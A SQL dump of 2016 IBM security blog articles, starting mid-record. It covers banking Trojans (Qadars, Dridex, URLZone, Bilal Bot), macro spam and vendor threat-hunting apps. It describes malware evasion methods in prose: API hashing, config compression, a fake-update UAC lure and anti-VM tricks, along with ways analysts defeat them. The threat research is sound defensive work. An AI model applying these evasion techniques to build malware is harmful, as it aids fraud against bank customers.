preprogrammed transaction flow and parameters, transfer thresholds and mule account numbers on which the malware relies to complete illicit online transactions. To steal two-factor authentication (2FA) codes from a user whose bank requires an out-of-band element, Qadars’ operators deployed the   as the malicious mobile component. In this case, Qadars even added the theft of codes from mobile devices to the ATS transaction orchestration flow. But Qadars didn’t just use Perkele on bank transactions. It also targeted Facebook users who secured their accounts with 2FA,   reported. Qadars historically infects endpoints using exploit kits hosted on compromised hosts, or domains purchased for the purpose of serving malware. The Trojan was also pushed to user endpoints via botnets, leveraging downloader-type malware. In current campaigns, Qadars   via the   to infect users, facilitating its infiltration with downloader malware. \n Although Qadars emerged in 2013, it has not been widely documented compared to other advanced Trojans of its type. Under the hood, Qadars’ developers borrowed code and fraud-facilitating concepts from the Zeus and Carberp Trojans, both of which had their source code leaked publicly in the past few years, thereby enabling malware authors to reuse parts of the code. X-Force first detected Qadars v2 in October 2015. The present version, Qadars v3, was released in Q1 2016. Our researchers indicated that by May 2016, the malware’s developer released detailed update notes for v3, all written in Russian, noting which bug fixes and improvements were made to the code, admin panel and ATS panel. The notes also provided information about browser and webinjection updates. The release notes indicated that Qadars is an advanced online banking Trojan that comes from a single source. Its source programs all operational components and does not buy injection kits from outsourced developers. When Qadars v3 was detected in the wild, the malware’s operators dedicated a new attack configuration to targeting all the major banks in Australia. Qadars’ fraud tactics are enabled through: In terms of attack methods, Qadars is capable of in-session fraud, remote-controlling the infected endpoint via virtual network computing (VNC) and performing a fraudulent transaction in real time when the user is logged on. Qadars can also collect victim credentials and use them in account takeover fraud at a later time and from a different device, depending on the targeted bank and the corresponding authentication challenges. Qadars v3 is continuously evolving. Yet another updated release in late August 2016 offered a new Qadars build with some code updates designed to evade detection, layer anti-research features, and improve the performance and readability of the malware’s webinjection mechanisms. The following section describes the technical changes made to the Qadars v3 in August 2016. This analysis was performed by malware researcher Hanan Natan and contributor Denis Laskov, senior security researcher at IBM Trusteer cybercrime labs. Qadars’ new version obfuscates all of its Win32 API calls by employing a common trick often used by banking malware of this grade, such as URLZone, Dridex and Neverquest. When the malware code starts to run and after the packer has completed its part, it dynamically resolves all the memory address of the APIs it’s going to use. Qadars contains hardcoded CRC32 values for all the function names it plans to use. This enables it to resolve the actual memory address of the function it will iterate over the export table of a particular system DLL and compare the CRC32 of the exported function name against the hardcoded one. If a match is found, Qadars saves the memory address of the function in a global variable. The malware adds a twist to this well-known dynamic API resolving method by XORing the hardcoded CRC32 values of the function names with another constant value that’s embedded in the binary itself. By employing this method, Qadars makes it a bit harder for scripts to find and annotate the actual Win32 APIs it uses. In the following disassembly excerpt, we can see how the malware resolves the Win32 API addresses and saves them into global variables: In the current Qadars version, we analyzed all the strings and data inside the binary that are XORed with a constant value that’s embedded in the binary. Just before the malware uses a string or data, it first performs an inverse XOR operation on it. Moreover, the malware added a compression layer for the configurations it downloads from the command-and-control (C&C) server. The compression layer was likely added due to the fact that webinjections, which are part of the configuration, have become larger and more sophisticated over time as more banks were added to the target list, making config files heavier and more easily detectable. While previous versions of the malware downloaded configurations that were only encrypted using an AES algorithm, the new version adds compression after the encryption phase. The configuration ultimately gets decompressed on the infected endpoint using  , a   based on the algorithm used in aPACK. Like other modular banking Trojans, such as  , for example, Qadars v3 downloads a number of extra modules from its C&C server to perform the actual malicious activities. The malicious payload, or the MainModule, as it was named by the malware developer, is responsible for fetching those additional modules from the C&C. One of the MainModule’s tasks is to inject the other downloaded modules into specific Windows processes according to the functionality of each module. It is possible to tell what task each module carries out according to a text string found in each one briefly describing its purpose: The names of the modules, as named by the developer of the malware, can be found in the DLL’s export ordinal table. The moduleBrowser_32.dll even contains the path of the pdb file used during the actual development: Additional changes in this version enrich the ability of the MainModule to download and use a Tor client to anonymize communications and covertly download modules from the C&C, ad hoc. To elevate its privileges on infected machines, Qadars’ dropper can opt to display a social engineering message prompting the user to download a new Windows security update. That fake message is used to influence the user into unknowingly accepting a UAC prompt and inadvertently granting Qadars admin rights. Once the user clicks the fake update notice window, the malware’s dropper runs itself again using the ShellExecuteEx Win32 API. This time, however, the system   to the user. The following figure shows an excerpt of the decompiled code. The malware doesn’t give the user an option to cancel or close the fake update window. Basically, users will encounter the UAC prompt again and again until they approve it, at which point the malware is launched again, this time with a new, higher privilege level: Qadars attack volumes, compared to Trojans like Neverquest or Dridex, are more humble. While it is not one of the top 10 financial malware threats on the global list, however, this Trojan has been flying under the radar for over three years, attacking banks in different regions using advanced features and capabilities. It’s possible that Qadars attack volumes remain limited because its operators choose to focus on specific countries in each of their infection sprees, likely to keep their operation focused and less visible. On the technical side, Qadars is an active and evolving malware project, as are other malicious codes of its type. In that sense, this threat is as advanced and problematic as other banking Trojans, such as  ,   or Ramnit. The language used in the Qadars v3 release notes suggests the malware developer is most likely a Russian-speaking black hat. Qadars’ operators are well-versed in orchestrating the malware infection operation by leveraging exploit kits, launching fraudulent transactions from infected endpoints and circumventing 2FA by infecting victims’ mobile devices. Beyond the preprogrammed parts of its configuration files, Qadars relies on communication with remote servers and ATS panels to fetch money mule account numbers in real time. It also displays social engineering injections delivered from its servers in real time and can enable hidden remote control of infected machines to defraud their owners’ accounts. Some MD5 hashes are: Presently, Qadars may not be detected as such by all anti-virus software. Current aliases from top AV vendors detect the dropper’s executable sample as:', '\'Advanced Threats\', \'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'Qadars Trojan\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/meanwhile-britain-qadars-v3-hardens-evasion-targets-18-uk-banks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (190, 'Threats Driving You Nuts? Try Threat Hunting With Sqrrl', 'Pamela Cobb', '2016-9-19', 'Squirrels have many predators and enemies (hawks, snakes and, of course, cars), but   shows how the hunted can become the hunter. Sqrrl is a leading threat hunting platform that is deeply integrated with IBM QRadar SIEM. When the   launched in 2015, its primary goal was to enable collaboration among security vendors to provide clients with valuable integration and enhancements. The   integration with Sqrrl is one of those successful partnerships. Sqrrl is a threat hunting app for IBM QRadar designed to help security analysts detect and investigate unknown threats that have slipped by their other defenses. It does this by fusing IBM QRadar’s data sources into a behavior graph, which is a unique visual environment for analyzing advanced adversarial behaviors. QRadar users will also benefit from Sqrrl’s kill chain analytics. These analytics, powered by machine learning, can detect the tactics, techniques and procedures (TTPs) of cybercriminals and complement the types of alerts that QRadar is already producing. Features of the app include: \n As a  , Sqrrl’s primary value proposition is to help analysts discover new, unknown threats that were neither previously detected nor properly prioritized. It uses powerful machine learning algorithms to detect TTPs, such as lateral movement and data staging. Sqrrl then links these TTPs into larger attack campaigns and attaches risk scores to entities and users to help analysts uncover previously hidden connections across these suspicious behaviors and correlate them with alerts from QRadar. For customers already engaged in  , Sqrrl helps them hunt with fewer resources and more junior analysts. Sqrrl’s link analysis visualization allows analysts to more quickly interrogate data without complex, custom queries. As a purpose-built hunting platform, common search paths are predefined and analysts can simply click through the data during a hunt. In 2015, Sqrrl deployed its threat hunting platform at a global security operations center at a Fortune 20. Today, Sqrrl ingests 80 TB of data a day, has 5 PB of data stored in its system, and enables clients to discover   and shrink their investigation and analysis time frames by an order of magnitude. \n Sqrrl is the only solution purpose-built for threat hunting, and more organizations realize that threat hunting is a critical additional layer of defense needed within security operations centers. Even organizations with the most sophisticated security systems, such as large financial and government agencies, are vulnerable to attacks. Security-conscious organizations need a threat hunting capability to proactively look for the threats that evade detection by other defenses. If you have a SIEM solution, a threat hunting capability is a natural extension of that investment. It provides you with additional visualization and analytics capabilities that enable proactive detection. To learn more about Sqrrl and QRadar,   for the Sqrrl Threat Hunting App for QRadar or watch our on-demand webinar featuring Sqrrl.', '\'IBM Security App Exchange\', \'IBM Security QRadar\', \'IBM Security QRadar Security Intelligence Platform\', \'Security Information and Event Management (SIEM)\', \'Threat Intelligence\'', 'https://securityintelligence.com/threats-driving-nuts-try-threat-hunting-sqrrl/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (191, 'Hey Dridex, Tu Runā Latviski?', 'Limor Kessem', '2016-9-15', 'Has Dridex been brushing up on its Latvian? Or perhaps its written Estonian skills? Maybe it’s preparing a long overseas stay requiring offshore banking accounts in the Cayman Islands? Recent Dridex configurations analyzed by IBM X-Force reveal that the   is resilient and more complex than your average malware campaign. Following several quiet months, a spike in renewed activity suggests the gang operating   with precision and planning. According to IBM X-Force Research, Dridex configurations from the past two months are replete with a hefty count of targets in some more common countries, such as the U.S., U.K., Canada and Australia. However, the Trojan is targeting some less charted territories as well, such as Lithuania, Latvia, Estonia, Lebanon and Ukraine, to name a few. This is quite uncommon for any banking Trojan. Per its configuration files, Dridex currently targets over 20 Latvian banks, three banks in Estonia, three in Lithuania and one in Ukraine, among its other uncommon choices of late. \n   Why would Dridex target just one bank in Ukraine, Lebanon or Lichtenstein? Perhaps the developers are moving money to and from these banks rather than stealing from them. Or maybe they start by testing one bank in a given region before developing more elaborate configurations. \n In most cases, Dridex is after retail banking accounts (48 percent of targets), but next on its list are banking platforms and URLs leading to: There sure seems to be more going on than previously. Much like  , Dridex is adding regular expressions to target digital banking platform providers, which are used by numerous banks. By doing that, Dridex enables itself to steal credentials from users of any bank that deploys that same platform instead of having to include the URL of each. X-Force researchers saw at least 10 different regular expressions of this type in recent Dridex configurations. The malware is scouting login credentials to a well-known background check vendor and one of the top recruitment sites in the U.S. It’s not hard to guess what those will be used for: Background checks give fraudsters tons of personal information on high-value targets. Recruitment sites are unknowingly abused by criminals for posting fake jobs, ultimately resulting in money mule recruitment in the target geography where the fraud is to be cashed out. This is rather telling: Dridex’s operators don’t typically recruit money mules in the U.S. or via recruitment sites. Perhaps they are running low on local accounts to facilitate their nefarious activity in America, especially with   being ever so active in the same country. So what’s the infection vector at this time for malware like Dridex, which is not only after consumers, but interested in infecting company employees? Unsurprisingly, the top choice continues to be poisoned Word macros delivered in a document file via email. This infection method was extremely popular among banking Trojan operators in 2015, when, according to  , macro malware levels hit a six-year high. This year is likely to end on a similar trend. Dridex has been leveraging poisoned Word macros since it emerged in 2014. Locky, a ransomware code distributed by the same botnets as Dridex, also leverages this infection method,   reported.  reported that, aside from Word macros, Dridex operators also conducted recent drive-by download campaigns to drop Locky infections using the Neutrino exploit kit and automate infections. Why did Dridex-delivering spam campaigns appear to be   during the summer? With banking malware operations of this type, it’s actually common to see a drop during the summer months. An actor on Twitter who calls himself Dridex Bot, purporting to be part of the Evil Corp gang, indicated the group was on vacation: While this may be true, a gang like Dridex is more likely to slow down to retool before speeding right back up. According to X-Force researchers, Dridex released four builds in the past 30 days alone, including two code updates to its internal strings and its API obfuscation scheme. The malware’s configurations were modified, new infection campaigns prepared,   sections created (No. 144, No. 1024) and new geographies targeted. Furthermore, the Locky operation continues full steam ahead. According to  , Dridex’s infrastructure is even being used to spread yet another ransomware piece: a new Trojan called Bart. It seems like it has been around forever, doesn’t it? But in reality, Dridex, in its current form, is only 2 years old. But it’s not so young in cybercrime terms, and the gang operating Dridex is having quite the busy year in 2016, dabbling in just about every kind of financial malice. This year, Dridex started copying the  , attacking companies and robbing millions at a time. Dridex also   in early 2016. In June, Dridex was linked with the  . Its Locky operation has been making the headlines far too often as well, mainly for terrorizing health care organizations across the globe with massive  . In fact,   of email attacks with malicious attachments in Q2 2016 contained Locky infections. Data from   showed that Dridex infections per day (infected IPs) have also been on the rise, reaching 60 percent spikes in some parts of Europe. From information gathered by X-Force Research on Dridex activities across the globe, it is evident Dridex’s botnet operators are a multifaceted group, very likely connected with additional crime factions that use the same resources to commit cybercrime. Is Dridex going away any time soon? This botnet appears to be more resilient than most. Dridex almost underwent a full   following the arrest of one of the alleged botnet administrators. Alas, the botnet managed to escape this attempt and continue its operations. In June,   reported that authorities attempted to disable Dridex by disrupting the Necurs botnet. That, too, was insufficient to halt the operations of Dridex and its branched ransomware arm. Necurs bounced back within a mere two weeks and   to the business of disseminating Dridex and Locky variants. Is this crime group rolling in illicit profits? Considering its resilience, size and all the connected parts of its operation, Dridex is likely the top cybercrime conglomerate of the decade. Researchers estimated that operators of the Dridex and Locky duo are  , not including the millions they must have put away after their alleged part in SWIFT-related attacks. If Dridex was indeed responsible for the SWIFT attacks, it is operating on the level of a billion-dollar crime ring. This makes Dridex a formidable foe for law enforcement. Security professionals can deploy   that evolve to mitigate the risks associated with Dridex. Researchers and analysts can also look up and share threat intelligence on Dridex activity, M.O. and indicators of compromise on the  .', '\'Advanced Threats\', \'Banking Trojan\', \'Dridex\', \'Fraud\', \'IBM X-Force Research\', \'Macro Malware\', \'Malware\', \'Online Banking\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/hey-dridex-tu-runa-latviski/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (192, 'Threat Intelligence: Is Your Current Capability Comprehensive?', 'Dominic Seddon', '2016-9-13', 'What are the first things that come to mind when you think about  ? Is it STIX/TAXII? CybOX? Third-party threat feeds? Indicators of compromise (IoCs)? These threat intelligence solutions all have one thing in common: They are mainly focused on the tactical level. That means they provide information to the tier-one and tier-two analysts within your security operations center (SOC).\n An effective threat intelligence capability is pervasive and persuasive up to the highest levels of an organization, including the  , other executives and the board. It should have a firm grasp of information levels and flows and be able to provide actionable intelligence strategically, operationally and tactically.\n At the strategic level, threat intelligence is the ability to contextualize the perceived threat into what it means for the business. It presents highly relevant information clearly, concisely and without jargon and outlines mitigation strategies to aid in the decision-making process. This capability is absolutely vital. If intelligence is not behind the wheel of your security vehicle, what is?\n Threat intelligence should be an indispensable component of any enterprise network’s day-to-day defense. Your threat intelligence analyst can help you understand how information flows between relevant teams and stakeholders, what actions should be taken and how it all relates to security policies, processes and procedures. Are your teams flooded with irrelevant information, or is there a steady stream of actionable intelligence?\n So your security strategy is now intelligence-driven, and the flow of information is entrenched in business-as-usual working practices. What now?\n You might focus on delivering relevant, reliable intelligence to the lower-tier analysts at the   coalface. You can save valuable analyst time by scrutinizing the IoCs and feeds received with an understanding of the attack surface to filter out irrelevant information.\n Need help developing your threat intelligence capability? See how   services and   can help you do things more intelligently.', '\'Chief Information Security Officer (CISO)\', \'Indicator of Compromise (IoC)\', \'Risk Management\', \'Security Information and Event Management (SIEM)\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/threat-intelligence-is-your-current-capability-comprehensive/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (193, 'VBA Macro Malware Jumping on the Ransomware Bandwagon', 'Michelle Alvarez', '2016-9-9', 'Macro malware   late last year. Then, in February of this year, researchers   that uses Visual Basic for Applications (VBA) macros to deliver its malicious payload. IBM Managed Security Services found even more notable activity associated with macro malware in the last two months. This activity is interesting because, as   reported, the attachment is a variant of Locky ransomware. The top 50 VBA malware-sending IPs — of literally thousands of malicious IPs — are those with the largest number of targets. These are broken down into 15 VBA spam malware-sending countries. The country with the greatest number of malicious IPs in the top 50 is Turkey, with 13. India is in second place with nine malicious IPs. These findings come as no surprise: As of Sept. 6, 2016, these countries held eighth and fourth place, respectively, in list of top 10 countries with outgoing malicious internet activity, according to  . The IP most active in sending VBA spam malware, in terms of both the greatest number of targets and security events, is  . It’s located in Pakistan, which topped Microsoft’s “Malware Infection Index 2016.” IBM X-Force Exchange assigned the IP a risk rating of 10, the highest level of risk. Infected machines, or bots, are often used to relay spam. This may or may not be the case with this particular IP, but it is interesting that seven of the VBA spam malware countries below were also among the most vulnerable to malware threats. All IPs in the top 50 currently have a risk rating of 10. Although the “from” field has a few variations, the majority of the malicious spam email observed by IBM MSS appeared to come from two different emails: emmacritchley@advantage-finance.co.uk and jen@purple-office.com. The malware spam had a DOCM file attached. The file names also varied greatly from email to email. Per usual, the initial attack vector is a phishing email. Its parting gift, if it’s successful? Ransomware. Educating employees about   continues to be paramount. A variety of approaches can be used, including videos, online phishing tests, webinars and in-person instruction. Employers should require training at regular intervals. Employee education should include these main points: Education is important, but cannot stand alone.   backed by comprehensive global threat intelligence is key. The aforementioned VBA malware attack attempts were detected by  . These signatures look for suspicious VBA macros within a document. Ensure signatures that detect VBA malware are enabled in your environment. The phish got past your educated user. It got past your network defense. Now, you need to be prepared to respond to the ransomware infection. IBM recently published its “ ,” which prepares an organization for the types of events and incidents it is likely to encounter. It also provides guidance once an incident has occurred, including analysis, containment, eradication, recovery and post-incident activity. The moral of the story: Don’t trust email attachments, even if they come from a trusted source. Unless you’re expecting an email with a document attached, call the sender and confirm its legitimacy. The computer might have been compromised and commandeered to send emails without senders’ knowledge, or their email addresses could have been spoofed.', '\'IBM Managed Security Services (MSS)\', \'Macro Malware\', \'Malware\', \'Phishing\', \'Phishing Emails\', \'Ransomware\', \'Spam\', \'Spam Emails\', \'Spear Phishing\'', 'https://securityintelligence.com/vba-macro-malware-jumping-on-the-ransomware-bandwagon/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (194, 'Keeping the Lights On: Security Trends in the Energy and Utilities Industry', 'Michelle Alvarez', '2016-9-8', 'Reliable. Secure. Constant. These qualities should define the  , and they usually do. Electric, gas and water utilities are built on a highly regulated framework run by professionals and backed by decades of operating experience and billions of dollars of infrastructure investment. Even so — and even with strong regulatory compliance — a   is still in the cards. The industry views that prospect with grave concern. An attack against a company supplying fuel, electricity or drinking water to a city or nation would impact far more than just economics. The health and welfare of a whole region, or even an entire nation, could be at risk. Recent media attention has focused mostly on incidents affecting the retail, finance and health care sectors, but now the spotlight is also shining on the energy and utilities industry. Attacks on electrical grids and utility providers have increased steadily over the past decade —most notably the coordinated cyberattack on a Ukrainian power grid in December 2015 that resulted in tens of thousands of people losing electricity. More recently, researchers   designed to perform reconnaissance on an energy grid’s system. \n Bad actors are actively seeking ways to attack the energy and utilities industry, and there is obvious and immediate cause for concern. The consequences could be significant across multiple industries. The   described the energy sector as “uniquely critical because it provides an ‘enabling function’ across all critical infrastructure sectors.” In other words, an attack on an energy company could have a domino effect, impacting all the industries that depend on it. The   and   industry must be prepared for cyberattacks. It’s important to recognize the areas of risk in your environment, understand potential attackers’ motivations and know what types of attack you’re likely to face. For more information, read the updated 2017 IBM report, “ .” It provides insights regarding the types of cyberattacks targeting the energy and utilities sector as well as recommendations on how it can address these security challenges.', '\'Cybercrime\', \'Energy and Utilities\', \'Energy Industry\', \'Security Trends\', \'Threat Intelligence\'', 'https://securityintelligence.com/keeping-the-lights-on-security-trends-in-the-energy-and-utilities-industry/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (195, 'Bilal Bot: That Time a Malware Developer Asked Me to Correct a Security Blog', 'Limor Kessem', '2016-9-6', 'In a recent email I received to my personal inbox, I was informed that one of my   caught the attention of a person claiming to be the developer of Android malware Bilal Bot. Why would a developer of crimeware be contacting one of the largest security vendors in the world? You can imagine my surprise when I learned he (or she) was actually seeking my help to better highlight the malware in our security blog. Bilal Bot is an Android malware app designed to enable the   and their users for the purpose of online banking fraud, card fraud and identity theft. Earlier this year, I described Bilal Bot as part of a blog post about increased competition in the underground mobile malware market, noting that Bilal Bot offered a lower cost/beta version that was an alternative to more advanced mobile malware, such as GM Bot. So, why did the alleged malware developer feel the need to read and email me about my blog? Let’s take a look at that peculiar email: According to the email, the author is dissatisfied with how we described his malware and that of his competitors. He seems to think we are not helping by omitting a piece of underground drama: Two of his competing vendors were banned from the underground forums where they once sold   and KNL Bot. For what it’s worth, we chose not to report that because both these Trojan developers can easily return to the forum after making amends with the buyers and forum admin. Furthermore, they can sell the malware on other boards and very likely still distribute it to buyers referred to them by their dubious customers, even if not openly over forum pages. Additionally, the alleged author wanted to inform us that Bilal Bot has now moved up from the beta version, resulting in increased features and pricing. He was not happy that we referred to it as low cost; to him, that constitutes “false information” about his product. Amazingly, he did not hesitate to contact an   employee to have that fixed! As I sit here still shaking my head at this, I might add that the supposed author offered to give an interview to provide us with the most up to date Bilal Bot information. Well, sure, Bilal Bot dev, we would be happy to conduct that interview. Bear in mind, though, that we may require you to verify your real-life identity and location. \n After looking into this further, we confirmed that an updated Bilal Bot post went up on underground boards several weeks after the email was originally sent to me, which may indicate that the person who emailed me is indeed the real developer. It’s worth noting that the email itself came from a mail.ru address, possibly suggesting that the malware author, or a person claiming to be the dubious developer, is Russian, even though the vendor sells Bilal Bot in English. One fact, however, did not jive: Bilal Bot’s underground vendor took pains to indicate his one true email address to potential buyers in the sales post, declaring that any other email address claiming to be him is an impostor. His official email as listed in the sales post was not in the mail.ru domain, so we cannot be certain that the email I received was indeed from the original malware author. That said, whoever sent it did seem to have a strong motivation to update the information about the malware on our blog. Was Bilal Bot indeed updated? Possibly. The first Bilal Bot post appeared in April, when it was in beta version, and the second one appeared in late May. The second post indicated that the malware’s capabilities had expanded since the beta version to include: Bilal Bot’s vendor indicated that the malware is undetectable to antivirus clients and will remain hidden on the infected device’s app screen. It will, however, show on the process list, but it cannot be removed or killed by the user. According to the post, overlay screens can be launched as the top-most activity upon access to any app and upon any type of action victims might take (opening an app, screen unlocking, network switching, etc.). The developer plans to add embedded Tor connectivity and an SMS spammer that can flood a determined number. According to the post, Bilal Bot works on Android distributions from v4 to v6 inclusive. Unlike malware that can communicate via messages, Bilal Bot’s operation requires internet connectivity or it will go offline. Like other mobile malware, this Trojan’s Android application package (APK) can be bound with other, more legitimate-looking apps, Trojanized games, etc. Bilal Bot samples are detected in the wild as overlay malware, based on their malicious mechanism and M.O. It is very interesting to see how the mobile malware community is growing in the underground, resembling the PC Trojans scene the same forums used to feature just five years ago. Developers are not only selling malware directly to users on the forums, but they are also brazenly contacting a security vendor to make sure that all information about their nefarious products is accurate. If I had to guess, I would say what bothered Bilal Bot’s vendor the most is that my original blog post called his malware a “low-cost option” compared to GM Bot. It is very possible that the price has gone up since the malware moved forward from the beta version, and the developer does not want potential buyers to demand the lower price they may have read about somewhere else. Mobile malware has indeed become a very popular product in underground boards. Looking at the previous quarters this year, researchers reported   in the second quarter of 2016, which is 1.7 times more than the amount logged during the previous quarter. These statistics continually alert service providers and their customers to rising risk levels and the prevalence of threats on mobile devices. Per IBM Trusteer data, the mobile banking malware category ranked third in Q2 2016, representing 15 percent of threats targeting users. Apps in this category are linked with online banking fraud — including overlay malware like Bilal Bot — as well as SMS hijackers that steal two-factor authentication codes and phishing apps purporting to be legitimate bank applications. In some cases, these Trojans even delete the bank’s genuine app and replace it with a malicious version. Reinforcing our statistics with real-world reporting, an FBI spokesperson said the government agency is seeing malware that   for the sole purpose of stealing account credentials. Within this context, Bilal Bot has similar overlay capabilities and fraud-enabling features like some of the most prolific mobile banking malware active in 2016. This category includes malware such as  , GM Bot, FakeBank, SlemBunk, Bankosy, AceCard, Asacub and, most recently,  . Nowadays, mobile devices are probably the most looked-at piece of technology end users have in their possession; the average person looks at his or her phone  . As for banking with our phones, studies show that 38 percent of consumers  , and 63 percent use phones to carry out standard banking tasks. In other words, mobile banking is being used more than ever before. With this in mind, cybercriminals are not going to miss out on opportunities to get users to open malicious messages or emails, click on evil links or download a innocuous-looking apps from dubious sources. Users can foil most of their attacks by following some familiar security steps:', '\'Application Security\', \'Fraud\', \'IBM\', \'IBM Security\', \'Malware\', \'Mobile Banking\', \'Mobile Security\', \'Ransomware\', \'X-Force\'', 'https://securityintelligence.com/bilal-bot-that-time-a-malware-developer-asked-me-to-correct-a-security-blog/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (196, 'Take Advantage of Security Cheat Codes With Behavioral Intelligence', 'Pamela Cobb', '2016-9-5', 'Before the heyday of the internet, I had to leave my apartment and actually haunt the back aisles of strip mall video game stores to figure out how to get past the boss fight at the end of my favorite first-person shooter game. If I had better   on the NPCs in “Wolfenstein,” I would have had an innate sense of their movements and strategies. Alas, in the early 1990s, I was more focused on passing particle dynamics at Georgia Tech and looking good in flannel, so I resorted to cheat codes. In an ideal world, we could set our security systems to “God Mode” and take all the hits from attackers; at the very least, we could turn on “notarget” and slip under the attackers’ radar. In the absence of those strategies, though, security teams must find ways to develop that innate sense of attacker movements and apply it their defenses. The closest we get to security God Mode is integrating network, endpoint and user data so security analysts can see active and historical user and device anomalies. By pairing a behavioral intelligence solution with a security intelligence solution, analysts can   for indicators of advanced and insider threats to enable rapid investigation and response before a breach even occurs. If you have the IBM QRadar Security Intelligence platform, a wide range of complementary apps are available on the   to extend those capabilities and increase the value of your security investment. E8 Security, one of QRadar’s partners in the App Exchange, ingests and analyzes data collected by QRadar. Through machine-learning, E8 determines patterns and prioritizes behavioral intelligence indicators of compromise (IOCs) that policy- and signature-based solutions are likely to miss. \n The E8 Security App for QRadar uses a customer’s own data to augment existing security products. It adds a sort of prevention superpower to security teams by drastically increasing their effectiveness. The app allows teams to quickly draw conclusions from avalanches of disparate log events in minutes and prevents a breach even when enforcement products can’t. \n The   provides behavioral threat intelligence by automatically drawing connections between seemingly unrelated incidents. Security analysts can easily visualize relationships between targets, explore divergent hypotheses and uncover hidden attack patterns. This level of insight gives security teams a unique view into what’s going on within their organization on a granular level, including telltale signs of internal and external threats. The app provides security teams with visibility into existing users, devices and traffic, and points out when they change — for instance, when new users and devices come online or access an application for the first time or from a different location. This   to noticing when someone or something is acting in a way they shouldn’t, and informing changes to existing policies to prevent those risky actions in the future. E8 also detects and prioritizes threatening and suspicious indicators that may not be obvious to security teams. It does so by using data science and machine learning to understand and report unknown indicators for which there aren’t existing policies or signatures — kind of like providing cheat codes that make teams more powerful against targeted and insider threats. This enables analysts to easily   in their environment by automatically correlating data patterns, visualizing relationships between disparate data sets, and making it quick and easy to search for and understand targets and attack stages, including lateral movement. What would normally take security teams hours only takes a few minutes with E8’s app, which means response times decrease dramatically and incidents are remediated right away. For one client, E8 Security detected backpacking in a customer environment. Backpacking occurs when an insider uses their system or application access to copy data onto removable media, such as a USB drive, and exfiltrates the data by carrying it out of the building. The first indicator was a significant uptick in logins to new systems that the employee had historically never visited. This was shown in the E8 app as a behavior graph that illustrated the volume of login events for that user over time. There were two spikes in the number of logins, separated by eight days, that stood out. Because the E8 app is able to profile entities by tying users to devices and modeling their normal behaviors, the customer was alerted to this employee’s abnormal actions. The customer’s suspicions about this employee were reinforced when the employee turned in their resignation shortly after the last instance of unusual logins. The customer was able to confront the employee with the evidence of their activity and then reclaim the stolen data. The E8 Security app used log data the customer already had to provide real intelligence, prioritized appropriately with a view of the employee’s historical behavior, so the customer could address it before it became a big problem. For more information on the E8 Security App for QRadar, visit the  , read the   or schedule a  . You can also watch the on-demand webinar, “ ,” to learn more about E8 and QRadar integrations.', '\'Behavioral Analytics\', \'IBM\', \'IBM Security App Exchange\', \'IBM Security QRadar\', \'IBM Security QRadar Security Intelligence Platform\', \'Insider Threat\', \'Security Intelligence\', \'Threat Intelligence\'', 'https://securityintelligence.com/take-advantage-of-security-cheat-codes-with-behavioral-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (197, 'Fighting Fire With WinDBG: Breaking URLZone’s Anti-VM Armor', 'Lior Keshet', '2016-9-2', 'URLZone, also known as Bebloh/Shiotob, is a sophisticated banking Trojan that first emerged in 2009. One of the most notable features of the   is its extensive anti-research features, which keep its inner workings under wraps. Unveiling the secrets that malware developers fight to keep hidden is one of the most effective ways to develop defenses against their nefarious devices. In this special research post, we’ll show how to overcome URLZone’s most recent advanced anti-research techniques and ultimately install it in a testing environment. In the following sections, we will illustrate in detail: For the purpose of the analysis, the sample MD5 is:  . It was first uploaded to VirusTotal on July 5, 2016. In order to successfully research URLZone, we will: The goal is to achieve these two tasks efficiently and to easily reproduce the results on new versions of the malware. The initial stage of the research begins with attempting to run the malware sample in a sandbox environment. Due to URLZone’s anti-research protections, the sample did not properly execute within the sandbox. The next step is manual dynamic analysis of the sample on a VM. On the VM, we follow URLZone’s deployment routine with  . We note that it uses the CreateProcessA API in order to create a new process with its own file path. After that, both the original process and the child process exit promptly. It appears that URLZone is once again detecting a research environment, this time a VM, and exists before deploying on the machine. Executing under Ollydbg and breaking at Kernel32!CreateProcessA teaches us that the malware executes itself with the CREATE_SUSPENDED flag, a strong indication for process hollowing. This is a classic technique, often used by malware to bypass antivirus products and add an anti-research layer. Process hollowing, or “run PE,” is not an inherently malicious action; it can be used by a legitimate Windows process as well. Process hollowing is typically implemented as follows: \n A quick peek at the memory dump of URLZone’s child process, using  , reveals that there are no imports and hardly any strings in this dump. This is suspicious and makes for a good hint that the malware is hiding quite a few secrets. Due to its ability to parse Windows structures, WinDBG was the debugger chosen to debug URLZone’s child process. Using “bp @$exentry” places a breakpoint (BP) at the executable’s entry point. At this point, the child process is running, but does nothing. It waits for the ResumeThread before proceeding. Resuming execution of URLZone’s parent process would result in the child process getting to the BP we set at the entry point. Since there are no imported functions, it’s very likely that the malware would use the PEB to dynamically find the Windows APIs it needs pretty soon after the entry point. A few functions in, we find the following function: The FS segment register holds a pointer to the thread environment block (TEB). We can look into the TEB data structure using WinDBG’s display type (dt) command, as follows: The code accesses the PEB at offset 0x0C, which is the Ldrfield of the PEB. PEB_LDR_DATA: This structure contains information about all currently loaded modules linked with the current process, which is URLZone’s solution to finding the addresses of the Windows APIs it needs. Next, the malicious code looks at the PEB_LDR_DATA at offset 0x1C: What we have here is a linked list that contains all the current process’s loaded modules. Looking at the code, we can see a loop that goes over the loaded modules until it encounters one that features the numeral “32” as part of its name, located at offset 0xC. This corresponds with the Unicode representation of the kernel32.dll. The function returns a pointer to the memory address of the kernel32.dll module via EAX. In the next stages, URLZone continues to locate specific functions, but instead of diving into every single opcode, we want to find a quicker method to continue the analysis. We guessed that the malware would soon use the LoadLibrary API to load additional modules, which turned out to be true. 